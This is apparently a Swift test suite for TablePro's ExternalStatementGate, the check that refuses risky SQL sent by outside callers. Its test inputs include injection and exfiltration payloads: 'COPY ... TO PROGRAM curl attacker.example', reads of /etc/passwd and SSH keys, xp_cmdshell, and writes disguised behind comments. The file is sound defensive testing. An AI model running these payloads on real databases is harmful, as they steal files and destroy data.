//
//  ExternalStatementGateTests.swift
//  TableProTests
//
//  The refusals every caller outside the app's own windows shares. MCP had them first and still has
//  its own suite; these pin them where they now live, so a change made for one surface cannot
//  quietly loosen the other.
//

import Foundation
@testable import TablePro
import TableProSQLGrammar
import Testing

struct ExternalStatementGateTests {
    private func statement(
        _ sql: String,
        databaseType: DatabaseType = .postgresql,
        externalAccess: ExternalAccessLevel = .readWrite,
        loadsExtensions: Bool = false,
        allowsDestructive: Bool = true,
        allowsMultiStatement: Bool = false,
        destructiveAlternative: String? = nil,
        allowsOnlyDataStatements: Bool = false
    ) -> ExternalStatementGate.Statement {
        ExternalStatementGate.Statement(
            sql: sql,
            connectionId: UUID(),
            databaseType: databaseType,
            externalAccess: externalAccess,
            loadsExtensions: loadsExtensions,
            allowsDestructive: allowsDestructive,
            allowsMultiStatement: allowsMultiStatement,
            destructiveAlternative: destructiveAlternative,
            allowsOnlyDataStatements: allowsOnlyDataStatements
        )
    }

    private func refusal(_ statement: ExternalStatementGate.Statement) -> ExternalStatementGateError? {
        do {
            _ = try ExternalStatementGate.classify(statement)
            return nil
        } catch let error as ExternalStatementGateError {
            return error
        } catch {
            return nil
        }
    }

    @Test("A plain read passes")
    func readsPass() throws {
        let classification = try ExternalStatementGate.classify(statement("SELECT 1"))
        #expect(classification.tier == .safe)
    }

    @Test("A caller held to data statements is refused a grant, a role change or a SET, and only that caller", arguments: [
        "GRANT ALL ON orders TO app", "ALTER ROLE app WITH SUPERUSER", "SET search_path = evil", "SELECT set_config('role', 'admin', false)",
    ])
    func dataStatementsOnlyRefusesTheRest(sql: String) {
        #expect(refusal(statement(sql, allowsOnlyDataStatements: true)) == .denied(ExternalStatementGate.dataStatementRefusal))
        #expect(refusal(statement(sql)) == nil)
    }

    @Test("A caller held to data statements runs reads and row changes")
    func dataStatementsOnlyRunsRowWork() {
        for sql in ["SELECT * FROM orders", "UPDATE orders SET paid = true WHERE id = 1", "INSERT INTO orders (id) VALUES (1)"] {
            #expect(refusal(statement(sql, allowsOnlyDataStatements: true)) == nil)
        }
    }

    // An engine with a query language of its own is read by its own reader against its curated list.
    @Test("A caller held to data statements runs data and refuses a definition on an engine with its own language", arguments: [
        (DatabaseType.mongodb, "db.orders.insertOne({a: 1})", true),
        (.kafka, "PRODUCE INTO \"orders\" KEY \"k\" VALUE \"v\"", true),
        (.surrealdb, "CREATE person:one SET name = 'a'", true),
        (.surrealdb, "DEFINE TABLE person SCHEMAFULL", false),
        (.surrealdb, "SELECT fn::mk() FROM ONLY person:one", false),
    ])
    func dataStatementsOnlyReadsOtherLanguages(type: DatabaseType, sql: String, runs: Bool) {
        #expect(QueryClassifier.isSQLDataStatement(sql, databaseType: type) == nil)
        let refused = refusal(statement(sql, databaseType: type, allowsOnlyDataStatements: true))
        #expect(refused == (runs ? nil : .denied(ExternalStatementGate.dataStatementRefusal)))
    }

    @Test("A write into a keyspace or database the engine keeps its own state in is a system scope")
    func systemScopesOfOtherLanguages() {
        #expect(QueryClassifier.writesSystemScope(database: "system_auth", schema: nil, databaseType: .cassandra))
        #expect(QueryClassifier.writesSystemScope(database: "admin", schema: nil, databaseType: .mongodb))
        #expect(!QueryClassifier.writesSystemScope(database: "shop", schema: nil, databaseType: .mongodb))
        #expect(!QueryClassifier.writesSystemScope(database: "admin", schema: nil, databaseType: .postgresql))
    }

    @Test("A MongoDB read passes a connection that is read only for external clients", arguments: [
        #"db.c.aggregate([{"$match": {"k": {"$nin": ["x"]}}}])"#,
        #"db.c.find({}, {"_id": 1}).limit(1)"#,
        "db.getCollection(\"user-events\").find({}).toArray()"
    ])
    func mongoReadPassesReadOnlyAccess(sql: String) throws {
        let classification = try ExternalStatementGate.classify(
            statement(sql, databaseType: .mongodb, externalAccess: .readOnly)
        )
        #expect(classification.tier == .safe)
    }

    /// Each one deletes in the shell, and each one passed this gate as a read.
    @Test("A MongoDB write dressed as a read is refused on read-only access", arguments: [
        #"db.c.find(db.c[("delete"+"Many")]({}))"#,
        "db.c.find(db.c.deleteMany ({}))",
        #"db.c.find(__tp_exec('{"op":"delete","collection":"c","filter":"{}","multi":true}'))"#,
        "--NaN+db.c.drop()\ndb.c.find({})"
    ])
    func disguisedMongoWriteRefused(sql: String) {
        #expect(refusal(statement(sql, databaseType: .mongodb, externalAccess: .readOnly, allowsMultiStatement: true)) != nil)
    }

    @Test("A Firebase write behind a comment the scanner drops is refused on read-only access", arguments: [
        "--\rGET users\n;DELETE users/alice",
        "--\rGET users\n;PATCH users/alice {\"admin\": true}",
        "/*/GET users\n*/;DELETE users/alice",
        ";DELETE users/alice"
    ])
    func firebaseWriteBehindDroppedCommentRefused(sql: String) {
        for type in [DatabaseType.firestore, .firebaseRealtimeDatabase] {
            #expect(refusal(statement(sql, databaseType: type, externalAccess: .readOnly)) != nil)
        }
    }

    @Test("A Firebase write that empties a node is refused where deletes are", arguments: [
        "PUT users {\".priority\": 1}",
        "PUT \u{FE0F} null",
        "PATCH / {\"users\": {\".priority\": 1}}"
    ])
    func firebaseEmptyingWriteRefusedWithoutDestructive(sql: String) {
        #expect(refusal(statement(sql, databaseType: .firebaseRealtimeDatabase, allowsDestructive: false)) != nil)
        #expect(refusal(statement(sql, databaseType: .firebaseRealtimeDatabase)) == nil)
    }

    @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
        "COPY users FROM '/etc/passwd'",
        "COPY users TO PROGRAM 'curl attacker.example'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT sys_read_file('kingbase.conf')",
        "SELECT * FROM sys_ls_dir('.')",
        "SELECT \"pg_read_file\"('/etc/passwd')",
        "SELECT \"lo_export\"(16384, '/tmp/out')"
    ])
    func filesystemAndCodeRefused(sql: String) {
        #expect(refusal(statement(sql)) == .denied(
            String(
                localized: """
                Statements that read or write files, or that run server-side code, cannot be sent \
                from outside the app. Run this one in TablePro instead.
                """
            )
        ))
    }

    @Test("A DuckDB read of a file, a directory or a URL is refused on read-only access", arguments: [
        "SELECT content FROM read_text('/Users/ann/.ssh/id_ed25519')",
        "SELECT file FROM glob('/Users/ann/.ssh/*')",
        "SELECT * FROM '/Users/ann/Documents/payroll.csv'",
        "SELECT * FROM read_csv('https://attacker.example/collect.csv')"
    ])
    func duckDBFileReadRefused(sql: String) {
        #expect(refusal(statement(sql, databaseType: .duckdb, externalAccess: .readOnly)) != nil)
        #expect(refusal(statement("SELECT * FROM notes", databaseType: .duckdb, externalAccess: .readOnly)) == nil)
    }

    @Test("Several statements in one call are refused unless the caller asked for them")
    func multiStatementRefused() {
        let refused = refusal(statement("SELECT 1; SELECT 2"))
        #expect(refused == .invalidArgument(String(localized: "Send one statement at a time.")))

        #expect(refusal(statement("SELECT 1; SELECT 2", allowsMultiStatement: true)) == nil)
    }

    @Test("A name spelled like a block keyword hides no second statement, and a block left open is refused", arguments: [
        ("CREATE TABLE begin(a int); DROP TABLE users", DatabaseType.postgresql),
        ("CREATE TABLE begin(a int); DROP TABLE users", .cloudflareD1),
        ("CREATE TABLE lookup (id INTEGER, upper$case TEXT); DROP TABLE users", .postgresql),
        ("CREATE TABLE \u{E9}case (id int); DROP TABLE users", .sqlite),
        ("CREATE VIEW flags AS SELECT id, CASE WHEN id > 0 THEN 1 ELSE 0 END loop FROM orders; DROP TABLE users", .postgresql),
        ("CREATE VIEW flags AS SELECT id, CASE WHEN id > 0 THEN 1 ELSE 0 END loop FROM orders; DROP TABLE users", .snowflake),
        ("CREATE PROCEDURE p() BEGIN SELECT begin FROM t; END; DROP TABLE users", .mysql),
        ("CREATE PROCEDURE p() BEGIN SELECT 1; BEGIN SELECT 2; END; DROP TABLE users", .mysql),
        ("CREATE PROCEDURE p() BEGIN SELECT 1; DROP TABLE users", .mysql),
    ])
    func blockKeywordNamesAreRefusedAsSeveralStatements(sql: String, databaseType: DatabaseType) {
        #expect(refusal(statement(sql, databaseType: databaseType))
            == .invalidArgument(String(localized: "Send one statement at a time.")))
    }

    @Test("A routine whose column is named begin is one statement", arguments: [
        ("CREATE PROCEDURE p() BEGIN SELECT begin FROM t; END", DatabaseType.mysql),
        ("CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN ATOMIC SELECT begin FROM t; END", .postgresql),
        ("CREATE TRIGGER tr AFTER INSERT ON t BEGIN SELECT begin FROM t; END", .sqlite),
    ])
    func routineWithABeginColumnPasses(sql: String, databaseType: DatabaseType) {
        #expect(refusal(statement(sql, databaseType: databaseType)) == nil)
    }

    /// SQL Server runs whatever one request carries as one batch, `;` or not, and a variable lives only in the batch
    /// that declares it, so a caller that takes scripts may send one there (#3078). Nowhere else.
    @Test("Only an engine that cuts scripts into GO batches takes a script in one call")
    func scriptsAreTakenWhereBatchesAreTheUnit() {
        #expect(ExternalStatementGate.acceptsScripts(on: .mssql))
        for engine: DatabaseType in [.postgresql, .mysql, .sqlite, .oracle, .clickhouse] {
            #expect(!ExternalStatementGate.acceptsScripts(on: engine), "\(engine.rawValue) takes one statement per call")
        }
    }

    /// `GO 50` runs the batch fifty times in sqlcmd and in the editor. A tool that sends one statement once would run it
    /// once and report success, so the count is refused rather than dropped.
    @Test("A statement a GO line repeats is refused unless the caller takes scripts")
    func repeatedStatementIsRefused() {
        let repeated = "DELETE TOP (1000) FROM dbo.log WHERE archived = 1\nGO 50"
        #expect(refusal(statement(repeated, databaseType: .mssql))
            == .invalidArgument(String(localized: "Send one statement at a time.")))
        #expect(refusal(statement(repeated, databaseType: .mssql, allowsMultiStatement: true)) == nil)
        #expect(refusal(statement("DELETE FROM dbo.log WHERE archived = 1\nGO", databaseType: .mssql)) == nil)
        #expect(refusal(statement("GO 3\nDELETE FROM dbo.log WHERE archived = 1", databaseType: .mssql)) == nil)
    }

    @Test("A caller that takes scripts claims leave to run several statements only where the engine takes them")
    func scriptCapabilityFollowsTheEngine() {
        let base: CallerCapabilities = [.mayWrite, .mayRunDestructive]
        #expect(ExternalStatementGate.capabilities(base, takingScriptsOn: .mssql) == base.union(.mayRunMultiStatement))
        for engine: DatabaseType in [.postgresql, .mysql, .sqlite, .oracle] {
            #expect(ExternalStatementGate.capabilities(base, takingScriptsOn: engine) == base, "\(engine.rawValue)")
        }
    }

    @Test("A SQL Server script clears the gate for a caller that takes scripts, and is still tiered by its worst statement")
    func sqlServerScriptIsGatedWhole() {
        let script = "DECLARE @sn NVARCHAR(50) = 'x';\nSELECT * FROM a WHERE sn = @sn;\nGO\nSELECT * FROM b"
        let takesScripts = ExternalStatementGate.acceptsScripts(on: .mssql)
        #expect(refusal(statement(script, databaseType: .mssql, allowsMultiStatement: takesScripts)) == nil)
        #expect(refusal(statement(script, databaseType: .mssql, externalAccess: .readOnly, allowsMultiStatement: takesScripts))
            == .denied(String(localized: "This connection is read only for external clients.")))
        #expect(refusal(statement(
            "SELECT 1;\nGO\nDROP TABLE orders",
            databaseType: .mssql,
            allowsDestructive: false,
            allowsMultiStatement: takesScripts
        )) == .denied(ExternalStatementGate.destructiveRefusal))
    }

    /// The connection setting a user reaches for when they want a script to look but not touch.
    @Test("A write is refused when the connection is read only for external clients", arguments: [
        ExternalAccessLevel.readOnly, ExternalAccessLevel.blocked
    ])
    func writesRefusedOnReadOnlyConnections(access: ExternalAccessLevel) {
        let refused = refusal(statement("UPDATE users SET name = 'x'", externalAccess: access))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))

        #expect(refusal(statement("SELECT 1", externalAccess: access)) == nil)
    }

    @Test(
        "A write hidden from the classifier by a comment is still refused on a read-only connection",
        arguments: [
            ("-- note\r\nDROP TABLE users", DatabaseType.postgresql),
            ("-- note\rDROP TABLE users", DatabaseType.postgresql),
            ("/*!50000 DROP TABLE users */", DatabaseType.mysql),
            ("/*M!100000 DROP TABLE users */", DatabaseType.mariadb),
        ]
    )
    func commentedWriteRefusedOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
        let refused = refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("An EXPLAIN that runs a write is refused on a read-only connection, however ANALYZE is spelled",
          arguments: ["EXPLAIN ANALYZE DELETE FROM users", "EXPLAIN ANALYSE DELETE FROM users"])
    func explainRunningAWriteRefusedOnReadOnlyConnection(sql: String) {
        #expect(refusal(statement(sql, externalAccess: .readOnly))
            == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test(
        "Stopping another session is refused on a connection read only for external clients",
        arguments: [
            ("SELECT pg_terminate_backend(123)", DatabaseType.postgresql),
            ("SELECT pg_cancel_backend(123)", DatabaseType.postgresql),
            ("SELECT pg_terminate_backend(123)", DatabaseType.redshift),
            ("SELECT pg_cancel_backend(123)", DatabaseType.cockroachdb),
            ("SELECT sys_terminate_backend(123)", DatabaseType.kingbasees),
            ("SELECT sys_reload_conf()", DatabaseType.kingbasees),
            ("SELECT query_to_xml('SELECT pg_terminate_backend(123)', true, false, '')", DatabaseType.postgresql),
            ("EXPLAIN ANALYSE SELECT pg_terminate_backend(123)", DatabaseType.postgresql),
            ("KILL 123", DatabaseType.mysql),
        ]
    )
    func stoppingASessionRefusedOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
        let refused = refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A write SQL Server runs without a terminator is refused on a connection read only for external clients",
          arguments: [
              "SELECT 1\nDROP TABLE t", "PRINT 'x' UPDATE t SET c = 1", "SELECT 1\nUPDATE [t] SET c = 1",
              "SELECT 1 ADD SIGNATURE TO dbo.p BY CERTIFICATE c",
          ])
    func unterminatedWriteRefusedOnReadOnlyConnection(sql: String) {
        #expect(refusal(statement(sql, databaseType: .mssql, externalAccess: .readOnly))
            == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A write after SQL Server's `1E--` is refused whether that is a comment or a signed exponent and a minus",
          arguments: [
              "SELECT 1E--1 DROP TABLE t", "SELECT 1.5e--1 DROP TABLE t", "SELECT 1E--1 INTO t2 FROM t",
              "SELECT 1E--'\nDROP TABLE t --'",
          ])
    func writeAfterSignedEmptyExponentRefusedOnReadOnlyConnection(sql: String) {
        #expect(refusal(statement(sql, databaseType: .mssql, externalAccess: .readOnly))
            == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A write an engine runs from inside a SELECT is refused on a connection read only for external clients",
          arguments: [
              ("SELECT * FROM orders WHERE (DELETE orders)", DatabaseType.surrealdb),
              ("SELECT * FROM (DELETE orders RETURN BEFORE)", DatabaseType.surrealdb),
              ("SELECT * FROM (UPDATE orders SET total = 0)", DatabaseType.surrealdb),
              ("SELECT * FROM (REMOVE TABLE orders)", DatabaseType.surrealdb),
              ("SELECT * FROM [DELETE FROM orders RETURNING id]", DatabaseType.cockroachdb),
              ("SELECT * FROM [UPDATE orders SET total = 0 RETURNING id]", DatabaseType.cockroachdb),
          ])
    func embeddedWriteRefusedOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
        let refused = refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A SELECT that holds only reads still passes a connection read only for external clients", arguments: [
        ("SELECT * FROM orders WHERE id IN (SELECT VALUE id FROM paid)", DatabaseType.surrealdb),
        ("SELECT * FROM [SHOW TABLES]", DatabaseType.cockroachdb),
    ])
    func embeddedReadPassesOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
        #expect(refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly)) == nil)
    }

    @Test("A write Snowflake's pipe operator chains after a read is refused on a connection read only for external clients",
          arguments: ["SELECT 1 ->> DELETE FROM orders", "SHOW TABLES ->> DROP TABLE orders", "SELECT 1->>CALL purge()"])
    func chainedWriteRefusedOnReadOnlyConnection(sql: String) {
        #expect(refusal(statement(sql, databaseType: .snowflake, externalAccess: .readOnly))
            == .denied(String(localized: "This connection is read only for external clients.")))
        let reads = statement("SHOW TABLES ->> SELECT \"name\" FROM $1", databaseType: .snowflake, externalAccess: .readOnly)
        #expect(refusal(reads) == nil)
    }

    @Test("A DROP Snowflake's pipe operator chains after a read is refused when the caller may not drop")
    func chainedDropRefused() {
        let refused = refusal(
            statement("SHOW TABLES ->> DROP TABLE orders", databaseType: .snowflake, allowsDestructive: false)
        )
        #expect(refused == .denied(ExternalStatementGate.destructiveRefusal))
    }

    @Test("A backup SQL Server runs after a read without a terminator is refused as a filesystem statement")
    func unterminatedBackupRefused() {
        let refused = refusal(statement("SELECT 1 BACKUP DATABASE d TO DISK = '/tmp/d.bak'", databaseType: .mssql))
        #expect(refused == .denied(
            String(
                localized: """
                Statements that read or write files, or that run server-side code, cannot be sent \
                from outside the app. Run this one in TablePro instead.
                """
            )
        ))
    }

    @Test("A statement SQL Server runs from a string is refused as the statement itself is", arguments: [
        "EXEC('DROP TABLE orders')",
        "EXEC sp_executesql N'DROP TABLE orders'",
        "EXEC('xp_cmdshell ''whoami''')",
    ])
    func dynamicTSQLRefused(sql: String) {
        #expect(refusal(statement(sql, databaseType: .mssql, allowsDestructive: false, allowsMultiStatement: true)) != nil)
    }

    @Test("A destructive statement is refused when the caller may not run one", arguments: [
        "DROP TABLE users", "TRUNCATE users", "DELETE FROM users", "EXPLAIN ANALYZE DELETE FROM users",
    ])
    func destructiveRefusedWithoutPermission(sql: String) {
        let refused = refusal(statement(sql, allowsDestructive: false))
        #expect(refused == .denied(ExternalStatementGate.destructiveRefusal))
    }

    @Test("A write that filters its rows is not destructive", arguments: [
        "DELETE FROM users WHERE id = 1", "UPDATE users SET name = 'x' WHERE id = 1", "UPDATE users SET name = 'x'",
        "INSERT INTO users (name) VALUES ('x')",
    ])
    func filteredWriteIsNotDestructive(sql: String) {
        #expect(refusal(statement(sql, allowsDestructive: false)) == nil)
        #expect(throws: ExternalStatementGateError.invalidArgument(ExternalStatementGate.notDestructiveRefusal)) {
            try ExternalStatementGate.requireDestructive(sql, databaseType: .postgresql)
        }
    }

    /// MCP points at its confirmation tool, AppleScript confirms interactively and never gets here.
    /// The sentence is the transport's to supply so neither surface inherits the other's advice.
    @Test("The destructive refusal carries the caller's own alternative")
    func destructiveRefusalCarriesAlternative() {
        let refused = refusal(
            statement("DROP TABLE users", allowsDestructive: false, destructiveAlternative: "Do it in the app.")
        )
        #expect(refused == .denied(
            ExternalStatementGate.destructiveRefusal + " Do it in the app."
        ))
    }

    @Test("A destructive statement passes when the caller may run one")
    func destructiveAllowed() throws {
        let classification = try ExternalStatementGate.classify(statement("DROP TABLE users"))
        #expect(classification.tier == .destructive)
        #expect(refusal(statement("DELETE FROM users")) == nil)
        try ExternalStatementGate.requireDestructive("DELETE FROM users", databaseType: .postgresql)
    }

    // MARK: - Consent

    @Test("Silent mode asks for nothing on a read, and Alert asks on a write")
    func consentFollowsSafeMode() {
        let read = QueryClassifier.classify("SELECT 1", databaseType: .postgresql)
        let write = QueryClassifier.classify("UPDATE users SET a = 1", databaseType: .postgresql)

        #expect(!ExternalStatementGate.requiresUserConsent(
            classification: read, sql: "SELECT 1", databaseType: .postgresql, safeModeLevel: .silent
        ))
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: write, sql: "UPDATE users SET a = 1", databaseType: .postgresql, safeModeLevel: .alert
        ))
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: read, sql: "SELECT 1", databaseType: .postgresql, safeModeLevel: .alertFull
        ))
    }

    @Test("On a connection that loads extensions, a read calling an extension's function is refused")
    func extensionFunctionRefused() {
        let sql = "SELECT BlobToFile(x'00', '/Users/me/.zshrc')"
        #expect(refusal(statement(sql, databaseType: .sqlite, externalAccess: .readOnly, loadsExtensions: true))
            == .denied(ExternalStatementGate.extensionCallRefusal(sql: sql, databaseType: .sqlite, loadsExtensions: true) ?? ""))
        #expect(refusal(statement(sql, databaseType: .sqlite, externalAccess: .readWrite, loadsExtensions: true)) != nil)
    }

    @Test("On a connection that loads extensions, reads using SQLite's own functions still pass")
    func builtinReadsPassWithExtensions() throws {
        let reads = [
            "SELECT rowid, distance FROM items WHERE embedding MATCH '[0.1, 0.2]' ORDER BY distance LIMIT 5",
            "SELECT count(*), json_extract(meta, '$.kind') FROM items GROUP BY 2",
            "SELECT * FROM pragma_table_info('items')"
        ]
        for sql in reads {
            let classification = try ExternalStatementGate.classify(
                statement(sql, databaseType: .sqlite, externalAccess: .readOnly, loadsExtensions: true)
            )
            #expect(classification.tier == .safe, "\(sql)")
        }
    }

    @Test("A connection without extensions is not scanned for calls")
    func noExtensionsNoScan() {
        #expect(ExternalStatementGate.extensionCallRefusal(
            sql: "SELECT vec_version()", databaseType: .sqlite, loadsExtensions: false
        ) == nil)
    }

    // Whatever the level says. A script that drops a table gets a person in front of it.
    @Test("A destructive statement always asks, even on Silent", arguments: ["DROP TABLE users", "DELETE FROM users"])
    func destructiveAlwaysAsks(sql: String) {
        let classification = QueryClassifier.classify(sql, databaseType: .postgresql)
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: classification, sql: sql, databaseType: .postgresql, safeModeLevel: .silent
        ))
    }
}

struct ExternalStatementGateExecutableCommentTests {
    private func refusal(_ sql: String, access: ExternalAccessLevel, allowsDestructive: Bool) -> ExternalStatementGateError? {
        let statement = ExternalStatementGate.Statement(
            sql: sql,
            connectionId: UUID(),
            databaseType: .mysql,
            externalAccess: access,
            loadsExtensions: false,
            allowsDestructive: allowsDestructive,
            allowsMultiStatement: false,
            destructiveAlternative: nil
        )
        do {
            _ = try ExternalStatementGate.classify(statement)
            return nil
        } catch let error as ExternalStatementGateError {
            return error
        } catch {
            return nil
        }
    }

    @Test("A DROP behind an executable comment is refused when the caller may not drop", arguments: [
        "/*!99999 ' */ DROP TABLE orders -- '",
        "/*M!999999 ' */ DROP TABLE orders -- '",
        "/*m! ' */ DROP TABLE orders -- '",
        "/*! /* ' */ DROP TABLE orders */",
    ])
    func hiddenDropIsRefused(sql: String) {
        #expect(refusal(sql, access: .readWrite, allowsDestructive: false)
            == .denied(ExternalStatementGate.destructiveRefusal))
    }

    @Test("A write behind a lowercase /*m! is refused on a read-only connection")
    func hiddenWriteIsRefusedOnReadOnly() {
        #expect(refusal("WITH c AS (SELECT 1) /*m! ' */ DELETE FROM orders -- '", access: .readOnly, allowsDestructive: true)
            == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A file written behind an executable comment is refused", arguments: [
        "SELECT * FROM orders /*m! ' */ INTO OUTFILE '/tmp/x' -- '",
        "SELECT * FROM orders /*!99999 ' */ INTO OUTFILE '/tmp/x' -- '",
    ])
    func hiddenOutfileIsRefused(sql: String) {
        guard case .denied(let reason) = refusal(sql, access: .readWrite, allowsDestructive: true) else {
            Issue.record("not refused: \(sql)")
            return
        }
        #expect(reason.contains("files"))
    }
}
